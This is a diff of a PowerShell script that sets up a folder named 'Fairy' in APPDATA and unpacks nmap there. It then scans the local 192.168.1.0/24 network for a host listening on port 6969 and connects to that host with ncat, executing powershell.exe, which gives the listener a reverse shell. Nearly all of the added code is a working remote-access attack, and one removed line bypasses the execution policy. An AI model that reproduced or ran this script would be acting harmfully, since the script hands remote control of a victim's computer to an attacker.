@@ -1,28 +1,40 @@
-# bypass
-Set-ExecutionPolicy Bypass -Scope Process -Force
+# create folder
+Write-Output "Creating Fairy"
+New-Item $env:APPDATA -Name "Fairy" -ItemType "Directory" -Force
+Write-Output "Created Fairy"
+
+# change directory into Fairy to download and unzip file
 
 # extract nmap
-#Expand-Archive -LiteralPath ".\nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force
+Write-Output "Extracting File"
+Expand-Archive -LiteralPath ".\nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force
+Write-Output "File Extracted"
+
+# change directory into executables folder
+Write-Output "Changing Directory"
+Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
+Write-Output "Directory Changed"
 
 # scan for listening port 6969 on network
-#$ScanOutput = nmap -p 6969 -T5 192.168.1.0/24 --open
-$ScanOutput = "Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-05 22:26 +0800
-Nmap scan report for 192.168.1.4
-Host is up (0.00013s latency).
-
-PORT     STATE SERVICE
-6969/tcp open  acmsoda
-
-Nmap done: 256 IP addresses (11 hosts up) scanned in 38.49 seconds"
+Write-Output "Scanning for port"
+$ScanOutput = .\nmap.exe -p 6969 -T5 -n 192.168.1.0/24 --open
+Write-Output "Scan Finished"
 
 # get ip of listener
-#$ScanOutput | Select-String -Pattern "(192\.168\.1\.)\w+"
-$ScanOutput -match "192\.168\.1\.\w+"
-$ListenerIP = $matches[0]
-Write-Output $matches[0]
-Write-Output $ListenerIP
+Write-Output "Getting IP"
+$string = $ScanOutput -match "192\.168\.1\.\w+"
+$ListenerIP = $string.Substring(21)
+Write-Output "IP Extracted"
+
+# wait a while
+Write-Output "Waiting"
+Start-Sleep -Seconds 5
+Write-Output "Wait Finished"
 
 
+# connect to listener
+Write-Output "Connecting to listener"
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
 
 <#
 Set-ExecutionPolicy Bypass -Scope Process -Force;
